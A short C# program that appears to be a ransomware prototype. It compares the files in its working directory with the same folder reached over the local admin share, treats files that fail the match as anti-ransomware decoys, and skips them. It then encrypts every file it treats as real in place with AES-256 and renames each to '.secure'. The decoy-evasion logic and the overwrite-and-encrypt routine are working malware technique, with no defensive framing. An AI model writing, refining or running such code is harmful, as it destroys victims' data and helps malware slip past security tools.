using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using static System.Net.WebRequestMethods;

class Program
{
    static List<string> decoyFiles = new List<string>();
    static List<string> realFiles = new List<string>();

    static void CompareFiles(string[] files1, string[] files2)
    {
        foreach (var file1 in files1)
        {
            bool found = false;
            foreach (var file2 in files2)
            {
                if (Path.GetFileName(file1) == Path.GetFileName(file2))  // Only comparing file names
                {
                    found = true;
                    realFiles.Add(file1);
                    break;
                }
            }

            if (!found)
            {
                decoyFiles.Add(file1);
            }
        }
    }

    static void EncryptFile(string filePath)
    {
        try
        {
            if (Path.GetExtension(filePath).Equals(".exe", StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("Skipping encryption for executable files.");
                return;
            }

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();

                byte[] key = aes.Key;
                byte[] iv = aes.IV;

                // Read original file content
                byte[] fileContent = System.IO.File.ReadAllBytes(filePath);

                using (FileStream outputFileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    outputFileStream.Write(key, 0, key.Length); // Store key (should use secure storage instead)
                    outputFileStream.Write(iv, 0, iv.Length);   // Store IV
                    cryptoStream.Write(fileContent, 0, fileContent.Length);
                }
            }

            // Rename the file to .secure extension (corrected File.Move syntax)
            string newFilePath = Path.ChangeExtension(filePath, ".secure");
            System.IO.File.Move(filePath, newFilePath);

            Console.WriteLine($"File encrypted successfully: {newFilePath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    static void Main()
    {

        string targetDirectory = @"\\127.0.0.1\C$\" + Directory.GetCurrentDirectory().Replace("C:\\","");


        string[] files1 = Directory.GetFiles(Directory.GetCurrentDirectory());

        string[] files2 = Directory.GetFiles(targetDirectory);

        CompareFiles(files1, files2);

        foreach (var file1 in decoyFiles)
        {
            Console.WriteLine($"File '{Path.GetFileName(file1)}' is a decoy !");
        }
        Console.WriteLine("============================ Real Files =======================");
        foreach (var file1 in realFiles)
        {
            Console.WriteLine($"File '{Path.GetFileName(file1)}' is a real encrypting ..... !");
            EncryptFile(file1); 
        }



        Console.ReadLine();
    }
}
